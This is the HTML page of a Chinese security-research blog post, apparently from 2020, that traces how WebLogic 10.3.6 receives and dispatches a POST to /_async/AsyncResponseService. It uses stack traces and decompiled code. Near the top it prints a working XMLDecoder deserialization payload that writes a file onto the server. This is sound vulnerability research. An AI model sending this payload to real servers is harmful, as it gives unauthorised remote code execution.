@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="#Weblogic请求包路径分析 问题描述Weblogic 10.3.6， Post访问：  http:&#x2F;&#x2F;172.16.100.97:7001&#x2F;_async&#x2F;AsyncResponseService 123456789101112131415161718192021222324 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;soapenv:En">
+<meta property="og:type" content="article">
+<meta property="og:title" content="weblogic&#x2F;Weblogic请求包路径分析">
+<meta property="og:url" content="http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Homer&#39;s blog">
+<meta property="og:description" content="#Weblogic请求包路径分析 问题描述Weblogic 10.3.6， Post访问：  http:&#x2F;&#x2F;172.16.100.97:7001&#x2F;_async&#x2F;AsyncResponseService 123456789101112131415161718192021222324 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;soapenv:En">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-10T15:28:24.539Z">
+<meta property="article:modified_time" content="2020-04-10T15:28:24.539Z">
+<meta property="article:author" content="Homer">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>weblogic/Weblogic请求包路径分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/10/weblogic/XMLDecoder%20RCE%E5%8F%98%E7%A7%8D/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/10/weblogic/XMLDecoder%20RCE%E8%B5%B7%E6%BA%90%EF%BC%9ACVE-2017-3506/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&text=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&is_video=false&description=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=weblogic/Weblogic请求包路径分析&body=Check out this article: http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&name=weblogic/Weblogic请求包路径分析&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#问题描述"><span class="toc-number">1.</span> <span class="toc-text">问题描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#路径分析"><span class="toc-number">2.</span> <span class="toc-text">路径分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#请求生成路径分析"><span class="toc-number">2.1.</span> <span class="toc-text">请求生成路径分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请求消费路径分析"><span class="toc-number">2.2.</span> <span class="toc-text">请求消费路径分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        weblogic/Weblogic请求包路径分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Homer's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-04-10T15:28:24.539Z" itemprop="datePublished">2020-04-10</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>#Weblogic请求包路径分析</p>
+<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>Weblogic 10.3.6， Post访问：</p>
+<p> <a href="http://172.16.100.97:7001/_async/AsyncResponseService" target="_blank" rel="noopener">http://172.16.100.97:7001/_async/AsyncResponseService</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:ads</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ads:Action</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">ads:Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ads:RelatesTo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">ads:RelatesTo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.6.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>xmldecoder_vul_test4445<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>信息 1 Post Body</p>
+<p>然后在processRequest处下断点，查看路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">handleRequest:20, WorkAreaServerHandler (weblogic.wsee.workarea)</span><br><span class="line">handleRequest:141, HandlerIterator (weblogic.wsee.handler)</span><br><span class="line">dispatch:114, ServerDispatcher (weblogic.wsee.ws.dispatch.server)</span><br><span class="line">invoke:80, WsSkel (weblogic.wsee.ws)</span><br><span class="line">handlePost:66, SoapProcessor (weblogic.wsee.server.servlet)</span><br><span class="line">process:44, SoapProcessor (weblogic.wsee.server.servlet)</span><br><span class="line">run:285, BaseWSServlet$AuthorizedInvoke (weblogic.wsee.server.servlet)</span><br><span class="line">service:169, BaseWSServlet (weblogic.wsee.server.servlet)</span><br><span class="line">service:820, HttpServlet (javax.servlet.http)</span><br><span class="line">run:227, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)</span><br><span class="line">invokeServlet:125, StubSecurityHelper (weblogic.servlet.internal)</span><br><span class="line">execute:301, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">execute:184, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">wrapRun:3732, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">run:3696, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:120, SecurityManager (weblogic.security.service)</span><br><span class="line">securedExecute:2273, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">execute:2179, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">run:1490, ServletRequestImpl (weblogic.servlet.internal)</span><br><span class="line">execute:256, ExecuteThread (weblogic.work)</span><br><span class="line">run:221, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>
+
+<p>信息 2 请求栈</p>
+<p>可以看到，路径还是很深的，其中涉及到多个模块。大致的流程是：</p>
+<ol>
+<li>有个线程在不停地消费请求</li>
+<li>初始化请求的Servlet上下文</li>
+<li>由BaseWSServlet的service执行这个请求</li>
+<li>BaseWSServlet执行自己的处理逻辑，自重载的service开始执行process到handleRequest</li>
+</ol>
+<p>上述还有很多细节，下一小节会详细展开。</p>
+<p>另外还有一个问题，就是步骤1消费的请求是哪来的？当然，是我们的URL请求生成的。为了分析的完整性，还是需要分析一下请求生成的路径。</p>
+<h2 id="路径分析"><a href="#路径分析" class="headerlink" title="路径分析"></a>路径分析</h2><h3 id="请求生成路径分析"><a href="#请求生成路径分析" class="headerlink" title="请求生成路径分析"></a>请求生成路径分析</h3><p>接着上图<code>信息2</code>继续分析，因为栈底的<code>run:221, ExecuteThread</code>在消费请求，那么我们看看请求是谁喂的。</p>
+<p>先看看<code>ExecuteThread</code>的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">         <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="keyword">if</span> (<span class="keyword">this</span>.workEntry != <span class="keyword">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">this</span>.execute(<span class="keyword">this</span>.workEntry.getWork());</span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 WorkAdapter var1 = <span class="keyword">this</span>.workEntry;</span><br><span class="line">                 <span class="keyword">this</span>.reset();</span><br><span class="line">                 RequestManager.getInstance().registerIdle(<span class="keyword">this</span>, var1);</span><br><span class="line">                 var1 = <span class="keyword">null</span>;</span><br><span class="line">                 <span class="keyword">if</span> (<span class="keyword">this</span>.workEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">this</span>.waitForRequest();</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; <span class="keyword">catch</span> (ShutdownError var4) &#123;</span><br><span class="line">                 ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>信息 3 run</p>
+<p>显然，被消费的请求就是<code>workEntry</code>，且这个线程是死循环在执行任务。</p>
+<p>经过阅读代码和断点调试尝试，找到了丢请求任务的代码：</p>
+<p>来自<code>weblogic/servlet/internal/MuxableSocketHTTP.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resolveServletContext</span><span class="params">(String var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ServletContextManager var2 = <span class="keyword">this</span>.httpServer.getServletContextManager();  </span><br><span class="line">    ContextVersionManager var3 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (var1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        var3 = var2.resolveVersionManagerForURI(var1);	------<span class="number">4.1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var3 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.handleNoContext();	------<span class="number">4.2</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        WebAppServletContext var4;</span><br><span class="line">        <span class="keyword">if</span> (var3.isVersioned()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.request.initContextManager(var3);</span><br><span class="line">            var4 = <span class="keyword">this</span>.request.getContext();</span><br><span class="line">            <span class="keyword">this</span>.request.getSessionHelper().resetSession(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">this</span>.request.getRequestParameters().resetQueryParams();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var4 = var3.getContext(<span class="keyword">this</span>.request.isAdminChannelRequest());</span><br><span class="line">            <span class="keyword">this</span>.request.initContext(var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.response.initContext(var4);</span><br><span class="line">        <span class="keyword">if</span> (HTTPDebugLogger.isEnabled()) &#123;</span><br><span class="line">            HTTPDebugLogger.debug(<span class="string">"Servlet Context: "</span> + var4 + <span class="string">" is resolved for request: '"</span> + <span class="keyword">this</span>.request.toStringSimple() + <span class="string">"'"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.initAndValidateRequest(var4)) &#123;</span><br><span class="line">            WorkManager var5 = <span class="keyword">this</span>.request.getServletStub().getWorkManager();</span><br><span class="line">            <span class="keyword">if</span> (var5 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Could not determine WorkManager for : "</span> + <span class="keyword">this</span>.request);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var5.schedule(<span class="keyword">this</span>.request); ------<span class="number">4.3</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>信息 4 </p>
+<p>这个函数很重要，在4.1处根据传入的请求路径找到对应的servlet，然后初始化请求数据包，在4.3处将请求包丢出去消费。</p>
+<p>![image-20200130203201302](/Users/panicall/Library/Application Support/typora-user-images/image-20200130203201302.png)</p>
+<p>信息 5</p>
+<p>请求参数就是我们的路径uri: <code>/_async/AsyncResponseService</code></p>
+<p>根据这个uri，<code>resolveVersionManagerForURI</code>匹配servlet:</p>
+<p><code>resolveVersionManagerForURI</code> -&gt; <code>resolveVersionManagerForURI</code> -&gt; <code>lookupVersionManager</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ContextVersionManager <span class="title">lookupVersionManager</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (ContextVersionManager)<span class="keyword">this</span>.contextTable.get(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>信息 6</p>
+<p>看看这个contextTable内容是啥？</p>
+<p>![image-20200130212409185](/Users/panicall/Library/Application Support/typora-user-images/image-20200130212409185.png)</p>
+<p>信息 7</p>
+<p>里面有我们的<code>/_async</code>。 展开看下<code>/_async</code>对应的servlet是哪个？</p>
+<p>![image-20200130214009238](/Users/panicall/Library/Application Support/typora-user-images/image-20200130214009238.png)</p>
+<p>信息 8</p>
+<p>可以看到，<code>/_async</code>下面有多个uri，每个uri有一个servlet映射，比如我们请求url中的<code>/AsyncResponseService</code>对应的servlet就是<code>WebappWSServlet</code>。详情见下表：</p>
+<table>
+<thead>
+<tr>
+<th>URI</th>
+<th>Servlet</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/AsyncResponseServiceSoap12Https</td>
+<td>weblogic.wsee.server.servlet.WebappWSServlet</td>
+</tr>
+<tr>
+<td>/AsyncResponseServiceSoap12Jms</td>
+<td>weblogic.wsee.server.servlet.WebappWSServlet</td>
+</tr>
+<tr>
+<td>/AsyncResponseServiceSoap12</td>
+<td>weblogic.wsee.server.servlet.WebappWSServlet</td>
+</tr>
+<tr>
+<td>/AsyncResponseServiceJms</td>
+<td>weblogic.wsee.server.servlet.WebappWSServlet</td>
+</tr>
+<tr>
+<td>AsyncResponseServiceServlethttps</td>
+<td>weblogic.wsee.server.servlet.WebappWSServlet</td>
+</tr>
+<tr>
+<td>/AsyncResponseService</td>
+<td>weblogic.wsee.server.servlet.WebappWSServlet</td>
+</tr>
+</tbody></table>
+<p>信息 9</p>
+<p>其实<code>/_async</code>下面的URI对应的Servlet都是<code>WebappWSServlet</code>。</p>
+<p>继续执行完<code>resolveVersionManagerForURI</code>，在<code>信息 4</code>中，<code>initAndValidateRequest</code>函数会设置找到的servlet到<code>request</code>中并丢出去。注意，如果用户提交的url不合法，即找不到app context，在4.2中直接返回404。</p>
+<p>那么，这些个contextTable是哪来的呢？可以看到有一些<code>registerContext</code>函数，下个断点。重启一下Weblogic docker。</p>
+<p>可以看到<code>registerContext</code>被调用了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">registerContext:146, ServletContextManager (weblogic.servlet.internal)</span><br><span class="line">doPostContextInit:437, HttpServer (weblogic.servlet.internal)</span><br><span class="line">loadWebApp:428, HttpServer (weblogic.servlet.internal)</span><br><span class="line">registerWebApp:976, WebAppModule (weblogic.servlet.internal)</span><br><span class="line">prepare:384, WebAppModule (weblogic.servlet.internal)</span><br><span class="line">prepare:176, ScopedModuleDriver (weblogic.application.internal.flow)</span><br><span class="line">prepare:199, ModuleListenerInvoker (weblogic.application.internal.flow)</span><br><span class="line">next:517, DeploymentCallbackFlow$1 (weblogic.application.internal.flow)</span><br><span class="line">nextState:52, StateMachineDriver (weblogic.application.utils)</span><br><span class="line">prepare:159, DeploymentCallbackFlow (weblogic.application.internal.flow)</span><br><span class="line">prepare:45, DeploymentCallbackFlow (weblogic.application.internal.flow)</span><br><span class="line">next:648, BaseDeployment$1 (weblogic.application.internal)</span><br><span class="line">nextState:52, StateMachineDriver (weblogic.application.utils)</span><br><span class="line">prepare:191, BaseDeployment (weblogic.application.internal)</span><br><span class="line">prepare:44, SingleModuleDeployment (weblogic.application.internal)</span><br><span class="line">next:348, BackgroundDeploymentService$1 (weblogic.application.internal)</span><br><span class="line">nextState:52, StateMachineDriver (weblogic.application.utils)</span><br><span class="line">run:273, BackgroundDeploymentService$BackgroundDeployAction (weblogic.application.internal)</span><br><span class="line">run:336, BackgroundDeploymentService$OnDemandBackgroundDeployAction (weblogic.application.internal)</span><br><span class="line">OnDemandURIAccessed:188, BackgroundDeploymentService (weblogic.application.internal)</span><br><span class="line">loadOnDemandURI:106, OnDemandManager (weblogic.servlet.internal)</span><br><span class="line">run:712, MuxableSocketHTTP$2 (weblogic.servlet.internal)</span><br><span class="line">run:545, SelfTuningWorkManagerImpl$WorkAdapterImpl (weblogic.work)</span><br><span class="line">execute:256, ExecuteThread (weblogic.work)</span><br><span class="line">run:221, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>
+
+<p>信息 10</p>
+<p>也就是，当一个新的webapp被安装的时候就会注册这个上下文。</p>
+<p>以上，详细介绍了用户输入一个合法的weblogic url，是如何生成request数据包的，接下来，我们看看weblogic是如何消费这个request数据包的。</p>
+<h3 id="请求消费路径分析"><a href="#请求消费路径分析" class="headerlink" title="请求消费路径分析"></a>请求消费路径分析</h3><p>在<code>信息 2</code>中，我们已经看到了消费的栈。本小节我们稍微详细看看。</p>
+<p>首先一个请求都会走到service函数，这里即<code>service:820, HttpServlet (javax.servlet.http)</code>。相关代码来自<code>weblogic/servlet/internal/StubSecurityHelper.class</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.stub == <span class="keyword">this</span>.reqi.getServletStub() &amp;&amp; <span class="keyword">this</span>.stub.isFutureResponseServlet()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.reqi.enableFutureResponse();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.servlet.service(<span class="keyword">this</span>.req, <span class="keyword">this</span>.rsp);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var2) &#123;</span><br><span class="line">            <span class="keyword">return</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>信息 11</p>
